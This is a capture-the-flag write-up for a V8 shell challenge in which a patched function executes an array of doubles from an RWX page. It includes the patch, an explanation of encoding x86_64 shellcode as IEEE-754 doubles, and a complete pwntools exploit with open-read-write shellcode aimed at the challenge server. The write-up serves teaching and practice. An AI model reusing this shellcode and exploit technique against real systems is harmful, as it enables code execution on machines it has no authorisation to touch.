# CyLab — Kit Engine

* **Platform:** CyLab Security Academy / picoCTF 2021 (Challenge ID: `168`)
* **Category:** Binary Exploitation / V8 RWX Shellcoding (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, JavaScript, pwntools, V8 Shell (`d8`)
* **Target:** Patched Google V8 Engine (`d8`)

---

## TL;DR

The challenge provides a patched V8 JavaScript shell (`d8`) where native file-reading built-ins have been stripped, but an artificial function `AssembleEngine()` has been introduced. `AssembleEngine` allocates a 4096-byte memory page mapped as Read-Write-Execute (**RWX**) via `mmap()`, iterates through a user-supplied JavaScript Array of Numbers, casts each element into an 8-byte IEEE-754 double, copies it directly into the executable page, and executes it as a function pointer (`void (*foo)() = (void(*)())func; foo();`). By packing Linux x86_64 `open-read-write` shellcode into an array of 64-bit IEEE-754 float values, we achieve immediate arbitrary code execution to read the flag.

---

## Recon

### Patch Inspection

Analyzing the C++ patch applied to the V8 codebase:

```cpp
void Shell::AssembleEngine(const v8::FunctionCallbackInfo<v8::Value>& args) {
    Isolate* isolate = args.GetIsolate();
    // Allocates RWX memory page
    double *func = (double*)mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,
                                MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);

    if (args[0]->IsArray()) {
        Local<Array> arr = args[0].As<Array>();
        for (uint32_t i = 0; i < arr->Length(); i++) {
            Local<Value> element = arr->Get(isolate->GetCurrentContext(), i).ToLocalChecked();
            // Copies 8-byte double precision values directly into executable page
            func[i] = element.As<Number>()->Value();
        }
        // Executes the injected page
        void (*foo)() = (void(*)())func;
        foo();
    }
}
```

Key observations:
1. **Direct RWX Execution Primitive:** Unlike typical browser pwn requiring complex JIT corruption (`addrof`/`fakeobj`), `AssembleEngine` explicitly executes the data passed to it.
2. **Double Precision Packing:** In JavaScript, numbers are 64-bit IEEE-754 floating point numbers (`double`). Every 8 bytes of machine code corresponds exactly to one `double` value in the array.

---

## Static Analysis & Vulnerability

### 1. IEEE-754 Representation of Shellcode

An x86_64 machine instruction sequence can be divided into 8-byte chunks (padding with NOPs `0x90` if the length is not a multiple of 8):

```text
  Raw Shellcode Bytes (8 bytes):
  [ B0 ][ B1 ][ B2 ][ B3 ][ B4 ][ B5 ][ B6 ][ B7 ]
                          |
                          v
      struct.unpack("<d", chunk)[0]
                          |
                          v
         JavaScript IEEE-754 Double
```

When `AssembleEngine` reads `element.As<Number>()->Value()`, the double is written back into memory as the exact original 8 bytes of machine code:

```text
       JavaScript Array: [ float_0, float_1, float_2, ... ]
                                     |
                                     v
       mmap RWX Page:    [ 8 Bytes ][ 8 Bytes ][ 8 Bytes ] ...
                                     |
                                     v
                                 call foo()
```

### 2. Shellcode Architecture

Because standard file APIs are removed from the environment, we construct a compact standalone x86_64 assembly payload that:
1. Opens `"flag.txt"` using `sys_open` (syscall `2`).
2. Reads contents using `sys_read` (syscall `0`) into a local buffer.
3. Writes output to standard output using `sys_write` (syscall `1`).
4. Terminates cleanly using `sys_exit` (syscall `60`).

---

## Dynamic Analysis & Exploitation Strategy

1. **Compiling Shellcode to Double Array:**
   Using Python's `struct` module:
   ```python
   def bytes_to_doubles(shellcode):
       if len(shellcode) % 8 != 0:
           shellcode += b"\x90" * (8 - (len(shellcode) % 8))
       doubles = []
       for i in range(0, len(shellcode), 8):
           chunk = shellcode[i:i+8]
           d = struct.unpack("<d", chunk)[0]
           doubles.append(d)
       return doubles
   ```
2. **Generating JS Script:**
   Generate `exploit.js` defining:
   ```javascript
   var shellcode = [1.2345e-300, ...];
   AssembleEngine(shellcode);
   ```
3. **Execution:**
   Send the script over the TCP socket to `d8`, receiving the flag output.

---

## Exploit

The complete exploit script is available at [send.py](send.py):

```python
#!/usr/bin/env python3
import struct, sys, re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "chatelaine.cylabacademy.net", 33409

# x86_64 assembly: open("flag.txt", 0) -> read(fd, rsp, 64) -> write(1, rsp, 64)
SHELLCODE = asm("""
    xor rax, rax
    push rax
    mov rbx, 0x7478742e67616c66     /* "flag.txt" */
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    mov al, 2                       /* sys_open */
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 64
    xor rax, rax                    /* sys_read */
    syscall

    mov rdx, rax
    mov al, 1                       /* sys_write */
    mov rdi, 1
    mov rsi, rsp
    syscall

    mov al, 60                      /* sys_exit */
    xor rdi, rdi
    syscall
""")

def to_doubles(sc):
    if len(sc) % 8 != 0:
        sc += b"\x90" * (8 - (len(sc) % 8))
    return [struct.unpack("<d", sc[i:i+8])[0] for i in range(0, len(sc), 8)]

def solve(io):
    doubles = to_doubles(SHELLCODE)
    js_payload = f"var code = {doubles};\nAssembleEngine(code);\n"

    io.sendline(js_payload.encode())
    data = io.recvall(timeout=4)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 send.py
[+] Opening connection to chatelaine.cylabacademy.net on port 33409: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 33409
```

---

## Key Takeaways & Lessons

1. **Binary Data Representation via Floating Point Numbers:** In environments restricted to high-level numeric types, any arbitrary byte sequence can be mapped 1:1 into 64-bit IEEE-754 doubles using `struct.unpack("<d", ...)`.
2. **Insecure Native Extension Functions:** Exposing raw system primitives like `mmap(RWX)` and dereferencing user arrays as function pointers bypasses the sandbox guarantees of modern browser engines.
3. **Standalone Syscall Sequences:** When standard library symbols are stripped or unavailable within browser processes, writing direct Linux syscalls (`open`, `read`, `write`) ensures self-contained execution.
